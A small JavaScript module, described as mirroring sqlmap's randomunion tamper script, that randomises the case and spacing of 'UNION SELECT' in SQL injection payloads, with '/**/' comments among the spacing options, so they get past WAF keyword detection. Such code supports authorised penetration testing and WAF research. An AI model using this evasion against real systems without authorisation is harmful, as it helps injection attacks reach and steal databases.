// 随机 UNION SELECT 格式：随机化 UNION SELECT 关键字间距和大小写
// 对标 sqlmap randomunion.py
export const randomunion = {
  name: 'randomunion',
  description: '随机化 UNION SELECT 关键字间距和大小写，绕过 WAF 关键字检测',
  /**
   * @param {string} payload
   * @param {object} ctx
   * @returns {string}
   */
  transform(payload, ctx) {
    const src = String(payload ?? '');
    return src.replace(/\bUNION\s+SELECT\b/gi, () => {
      const randCase = (s) => s.split('').map(c => Math.random() > 0.5 ? c.toUpperCase() : c.toLowerCase()).join('');
      const spaces = Math.random() > 0.5 ? ' ' : (Math.random() > 0.5 ? '  ' : '/**/');
      return `${randCase('UNION')}${spaces}${randCase('SELECT')}`;
    });
  },
};
export default randomunion;
